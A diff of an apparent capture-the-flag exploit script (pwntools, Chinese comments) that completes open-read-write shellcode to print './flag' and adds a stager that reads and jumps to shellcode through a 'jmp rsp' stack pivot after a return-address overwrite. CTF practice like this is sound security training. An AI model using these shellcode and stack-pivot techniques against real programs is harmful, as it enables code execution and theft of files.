@@ -65,9 +65,10 @@ r.send(shellcode_flag)
 r.interactive()
 
 
-# =========> 手搓 shellcode (没写完) <===========
+# =========> 手搓 shellcode <===========
 # sss = r'./flag'
 # sss[::-1].encode('utf-8').hex()  ===>> 0x67616c662f2e
+"""
 shellcode_flag = asm('''
         xor rax,rax
         mov rdi,0x67616c662f2e
@@ -77,6 +78,34 @@ shellcode_flag = asm('''
         xor rdx,rdx
         mov rax,2
         syscall
-        
-        ....
+        mov rdi,3
+        mov rsi,rsp
+        mov rdx,0x50
+        mov rax,0
+        syscall
+        mov rdi,1
+        mov rsi,rsp
+        mov rdx,0x50
+        mov rax,1
+        syscall
 ''')
+
+shellcode_jmp = asm(f'''
+        xor rdi,rdi
+        mov rsi,{mmap}
+        mov rdx,0x100
+        mov rax,0
+        syscall
+        mov rax,{mmap}
+        call rax
+''')
+
+shellcode_jmp = shellcode_jmp.ljust(0x28, b'\x00')
+shellcode_jmp += p64(jmp_rsp)
+shellcode_jmp += asm(f'sub rsp,0x30;jmp rsp')  # 栈迁移到mmap
+
+r.recvuntil(b'have fun!')
+r.sendline(shellcode_jmp)
+r.send(shellcode_flag)
+r.interactive()
+"""
